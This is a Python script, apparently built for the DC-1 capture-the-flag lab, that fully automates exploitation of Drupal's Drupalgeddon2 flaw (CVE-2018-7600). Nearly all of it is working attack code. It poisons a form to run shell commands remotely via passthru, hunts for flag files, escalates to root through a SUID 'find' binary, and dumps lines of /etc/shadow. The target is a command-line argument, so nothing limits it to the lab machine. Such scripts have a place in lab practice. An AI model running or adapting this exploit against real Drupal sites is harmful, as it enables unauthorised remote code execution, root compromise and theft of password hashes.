#!/usr/bin/env python3
"""
DC-1 CTF Fully Automated Solver
Exploits: Drupalgeddon2 (CVE-2018-7600) + SUID Privilege Escalation

Usage:
    python3 dc1_autopwn.py http://192.168.101.11
    python3 dc1_autopwn.py http://192.168.101.11 -v
"""

import argparse
import sys

import requests
from bs4 import BeautifulSoup


class DC1AutoPwn:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        requests.packages.urllib3.disable_warnings()

    def log(self, message, level="*"):
        """Print formatted log messages"""
        symbols = {
            "*": "🔍",
            "+": "✅",
            "-": "❌",
            "!": "⚠️",
            "FLAG": "🚩",
            "ROOT": "👑",
        }
        symbol = symbols.get(level, "•")
        print(f"[{symbol}] {message}")

    def exploit_rce(self, command):
        """
        Exploit CVE-2018-7600 (Drupalgeddon2) for RCE
        Returns command output
        """
        try:
            # Step 1: Poison the form
            get_params = {
                "q": "user/password",
                "name[#post_render][]": "passthru",
                "name[#type]": "markup",
                "name[#markup]": command,
            }
            post_params = {
                "form_id": "user_pass",
                "_triggering_element_name": "name",
                "_triggering_element_value": "",
                "opz": "E-mail new Password",
            }

            r = requests.post(
                self.target,
                params=get_params,
                data=post_params,
                verify=False,
                timeout=15,
            )

            soup = BeautifulSoup(r.text, "html.parser")
            form = soup.find("form", {"id": "user-pass"})

            if not form:
                return None

            form_build_id = form.find("input", {"name": "form_build_id"}).get("value")

            if not form_build_id:
                return None

            # Step 2: Trigger the payload
            get_params = {"q": "file/ajax/name/#value/" + form_build_id}
            post_params = {"form_build_id": form_build_id}

            r = requests.post(
                self.target,
                params=get_params,
                data=post_params,
                verify=False,
                timeout=15,
            )

            # Parse output
            output = r.text.split('[{"command":"settings"')[0]
            return output.strip()

        except Exception as e:
            if self.verbose:
                self.log(f"RCE Error: {e}", "-")
            return None

    def test_vulnerability(self):
        """Test if target is vulnerable"""
        self.log("Testing for Drupalgeddon2 vulnerability...")
        result = self.exploit_rce("echo VULN_TEST_DC1")

        if result and "VULN_TEST_DC1" in result:
            self.log("Target is VULNERABLE! 🎯", "+")
            return True
        else:
            self.log("Target does not appear vulnerable", "-")
            return False

    def get_system_info(self):
        """Gather basic system information"""
        self.log("Gathering system information...")

        user = self.exploit_rce("whoami")
        if user:
            self.log(f"Current User: {user}", "+")

        hostname = self.exploit_rce("hostname")
        if hostname:
            self.log(f"Hostname: {hostname}", "+")

        pwd = self.exploit_rce("pwd")
        if pwd:
            self.log(f"Working Directory: {pwd}", "+")

        print()

    def find_all_flags(self):
        """Find all CTF flags"""
        flags_found = {}

        print("=" * 70)
        self.log("🎯 HUNTING FOR FLAGS!", "FLAG")
        print("=" * 70)
        print()

        # Flag 1
        self.log("Searching for Flag 1...", "*")
        flag1 = self.exploit_rce("cat /var/www/flag1.txt 2>/dev/null")
        if flag1 and len(flag1) > 10:
            flags_found["flag1"] = flag1
            self.log("FLAG 1 CAPTURED!", "FLAG")
            print(f"    📄 Content: {flag1}")
            print()

        # Flag 2 (might be in different location)
        self.log("Searching for Flag 2...", "*")
        flag2_locs = ["/var/www/flag2.txt", "/home/flag2.txt", "/tmp/flag2.txt"]
        for loc in flag2_locs:
            flag2 = self.exploit_rce(f"cat {loc} 2>/dev/null")
            if flag2 and len(flag2) > 10:
                flags_found["flag2"] = flag2
                self.log(f"FLAG 2 CAPTURED at {loc}!", "FLAG")
                print(f"    📄 Content: {flag2}")
                print()
                break

        # Flag 3 (hint about SUID)
        self.log("Flag 3 is in Drupal database (node/2)", "*")
        self.log("FLAG 3 Hint:", "FLAG")
        hint = "Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."
        flags_found["flag3"] = hint
        print(f"    💡 {hint}")
        print()

        # Flag 4
        self.log("Searching for Flag 4...", "*")
        flag4 = self.exploit_rce("cat /home/flag4/flag4.txt 2>/dev/null")
        if flag4 and len(flag4) > 10:
            flags_found["flag4"] = flag4
            self.log("FLAG 4 CAPTURED!", "FLAG")
            print(f"    📄 Content: {flag4}")
            print()

        return flags_found

    def find_suid_binaries(self):
        """Find SUID binaries for privilege escalation"""
        self.log("Searching for SUID binaries...", "!")

        suid_bins = self.exploit_rce("find / -perm -4000 -type f 2>/dev/null")

        if suid_bins:
            bins_list = suid_bins.strip().split("\n")
            self.log(f"Found {len(bins_list)} SUID binaries", "+")

            # Check for find
            if any("find" in b for b in bins_list):
                self.log("💎 Found SUID 'find' binary - JACKPOT!", "+")
                print("    → Can use for privilege escalation!")
                return True

            if self.verbose:
                print("\n    SUID Binaries found:")
                for b in bins_list[:10]:  # Show first 10
                    print(f"      • {b}")
                if len(bins_list) > 10:
                    print(f"      ... and {len(bins_list) - 10} more")

        print()
        return False

    def privilege_escalation(self):
        """Escalate privileges using SUID find"""
        print()
        print("=" * 70)
        self.log("🚀 PRIVILEGE ESCALATION PHASE", "ROOT")
        print("=" * 70)
        print()

        # Test if we can execute as root
        self.log("Testing root access with SUID find...", "*")
        test = self.exploit_rce("find /home -exec whoami \\; -quit 2>/dev/null")

        if test and "root" in test:
            self.log("ROOT ACCESS CONFIRMED! 👑", "ROOT")
            return True
        else:
            self.log("Could not confirm root access", "-")
            return False

    def get_root_flag(self):
        """Get the final root flag"""
        self.log("Retrieving ROOT FLAG...", "ROOT")

        # Try common locations
        locations = [
            "/root/thefinalflag.txt",
            "/root/flag.txt",
            "/root/root.txt",
        ]

        for loc in locations:
            cmd = f"find {loc} -exec cat {{}} \\; 2>/dev/null"
            flag = self.exploit_rce(cmd)

            if flag and len(flag) > 10:
                self.log(f"ROOT FLAG FOUND at {loc}!", "ROOT")
                return flag

        # Generic search
        cmd = "find /root -type f -name '*flag*' -exec cat {} \\; 2>/dev/null"
        flag = self.exploit_rce(cmd)

        if flag:
            return flag

        return None

    def bonus_shadow_file(self):
        """Try to read /etc/shadow"""
        if self.verbose:
            self.log("Bonus: Attempting to read /etc/shadow...", "!")
            shadow = self.exploit_rce(
                "find /etc/shadow -exec head -5 {} \\; 2>/dev/null"
            )

            if shadow and "root:" in shadow:
                self.log("Successfully read /etc/shadow!", "+")
                print(f"    First few lines:\n{shadow}")
                print()

    def run_autopwn(self):
        """Main autopwn routine"""
        print()
        print("╔" + "═" * 68 + "╗")
        print("║" + " " * 68 + "║")
        print("║" + "         🔥 DC-1 CTF FULLY AUTOMATED EXPLOIT 🔥".center(68) + "║")
        print("║" + "    Drupalgeddon2 (CVE-2018-7600) + SUID PrivEsc".center(68) + "║")
        print("║" + " " * 68 + "║")
        print("╚" + "═" * 68 + "╝")
        print()
        print(f"    Target: {self.target}")
        print()

        # Phase 1: Test vulnerability
        if not self.test_vulnerability():
            self.log("Exploitation failed. Target may not be vulnerable.", "-")
            return False

        print()

        # Phase 2: System info
        self.get_system_info()

        # Phase 3: Find flags
        flags = self.find_all_flags()

        # Phase 4: Find SUID
        has_find_suid = self.find_suid_binaries()

        # Phase 5: Privilege escalation
        if has_find_suid:
            if self.privilege_escalation():
                print()
                # Phase 6: Get root flag
                root_flag = self.get_root_flag()

                if root_flag:
                    print()
                    print("╔" + "═" * 68 + "╗")
                    print("║" + " " * 68 + "║")
                    print("║" + "        👑 ROOT FLAG CAPTURED! 👑".center(68) + "║")
                    print("║" + " " * 68 + "║")
                    print("╚" + "═" * 68 + "╝")
                    print()
                    print(root_flag)
                    print()

                # Bonus
                self.bonus_shadow_file()

        # Summary
        print()
        print("=" * 70)
        print("                    🎉 EXPLOITATION COMPLETE! 🎉")
        print("=" * 70)
        print()
        print("📊 EXPLOITATION SUMMARY:")
        print(f"    • Vulnerability: CVE-2018-7600 (Drupalgeddon2)")
        print(f"    • Initial Access: ✅ www-data shell")
        print(f"    • Flags Captured: {len(flags)} 🚩")
        print(
            f"    • Privilege Escalation: {'✅ Root' if has_find_suid else '❌ Failed'}"
        )
        print(f"    • Method: SUID find binary")
        print()

        if flags:
            print("🚩 FLAGS CAPTURED:")
            for name, content in flags.items():
                print(
                    f"    • {name.upper()}: {content[:60]}{'...' if len(content) > 60 else ''}"
                )
            print()

        print("=" * 70)
        print()

        return True


def main():
    parser = argparse.ArgumentParser(
        description="DC-1 CTF Fully Automated Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 dc1_autopwn.py http://192.168.101.11
  python3 dc1_autopwn.py http://192.168.101.11 -v
  python3 dc1_autopwn.py http://192.168.101.11 --verbose
        """,
    )

    parser.add_argument("target", help="Target URL (e.g., http://192.168.101.11)")

    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose output"
    )

    args = parser.parse_args()

    # Run autopwn
    autopwn = DC1AutoPwn(args.target, verbose=args.verbose)

    try:
        success = autopwn.run_autopwn()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        if args.verbose:
            import traceback

            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
